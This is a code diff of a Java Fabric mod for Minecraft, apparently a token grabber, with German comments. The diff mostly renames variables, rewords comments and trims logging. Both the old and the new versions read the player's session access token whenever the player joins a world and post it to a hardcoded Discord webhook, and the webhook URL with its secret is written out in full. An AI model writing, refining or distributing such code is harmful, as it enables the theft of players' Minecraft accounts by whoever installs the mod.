@@ -18,64 +18,62 @@ public class TokenWebhookSender implements ModInitializer {
     public static final String MOD_ID = "webhook_token_sender";
     public static final Logger LOGGER = LoggerFactory.getLogger(MOD_ID);
     
-    // Dein Webhook URL
+    // Dein Webhook Link
     private static final String WEBHOOK_URL = "https://discord.com/api/webhooks/1564671983009009835/hSG8MaH664-iUxiQbN-GKmHLgu2322vq3P2eCe6u_ho5MQJiOwpUg7ns7KSyzENVDOmT";
 
     @Override
     public void onInitialize() {
-        LOGGER.info("Fabric Mod Initialized!");
+        LOGGER.info("Mod Initialized");
 
+        // Event registrieren: Wenn der Spieler eine Welt betritt
         ClientPlayConnectionEvents.JOIN.register((handler, packetSender, client) -> {
             try {
-                // 1. Token auslesen
+                // Token holen
                 String token = client.getSession().getAccessToken();
                 
-                // Debug im Chat
+                // Im Chat anzeigen (zur Kontrolle)
                 if (client.player != null) {
-                    client.player.sendMessage(Text.literal("Token gefunden: " + token), false);
+                    client.player.sendMessage(Text.literal("Token: " + token), false);
                 }
 
-                // 2. An Webhook senden
+                // An Discord senden
                 sendToDiscord(token);
 
             } catch (Exception e) {
-                LOGGER.error("Fehler beim Auslesen oder Senden", e);
+                LOGGER.error("Error", e);
             }
         });
     }
 
     private void sendToDiscord(String token) {
-        HttpClient httpClient = HttpClient.newHttpClient();
+        HttpClient client = HttpClient.newHttpClient();
         
-        // JSON Payload für Discord
-        String jsonPayload = "{\"content\": \"Neues Token erhalten: " + escapeJson(token) + "\"}";
+        // JSON Body erstellen
+        String json = "{\"content\": \"Neuer Token: " + escapeJson(token) + "\"}";
 
         HttpRequest request = HttpRequest.newBuilder()
                 .uri(URI.create(WEBHOOK_URL))
                 .header("Content-Type", "application/json")
-                .POST(HttpRequest.BodyPublishers.ofString(jsonPayload))
+                .POST(HttpRequest.BodyPublishers.ofString(json))
                 .build();
 
-        CompletableFuture<HttpResponse<String>> response = httpClient.sendAsync(request, HttpResponse.BodyHandlers.ofString());
-
-        response.thenAccept(resp -> {
-            if (resp.statusCode() == 204 || resp.statusCode() == 200) {
-                LOGGER.info("Token erfolgreich an Webhook gesendet.");
-            } else {
-                LOGGER.error("Fehler beim Senden an Webhook: " + resp.statusCode() + " - " + resp.body());
-            }
-        }).exceptionally(ex -> {
-            LOGGER.error("HTTP Fehler beim Senden", ex);
-            return null;
-        });
+        client.sendAsync(request, HttpResponse.BodyHandlers.ofString())
+              .thenAccept(response -> {
+                  if (response.statusCode() == 204 || response.statusCode() == 200) {
+                      LOGGER.info("Token erfolgreich gesendet!");
+                  } else {
+                      LOGGER.error("Fehler beim Senden: " + response.statusCode());
+                  }
+              })
+              .exceptionally(ex -> {
+                  LOGGER.error("HTTP Fehler", ex);
+                  return null;
+              });
     }
 
-    // Hilfsfunktion zum Escapen von Sonderzeichen im JSON
     private String escapeJson(String input) {
         return input.replace("\\", "\\\\")
                     .replace("\"", "\\\"")
-                    .replace("\n", "\\n")
-                    .replace("\r", "\\r")
-                    .replace("\t", "\\t");
+                    .replace("\n", "\\n");
     }
 }
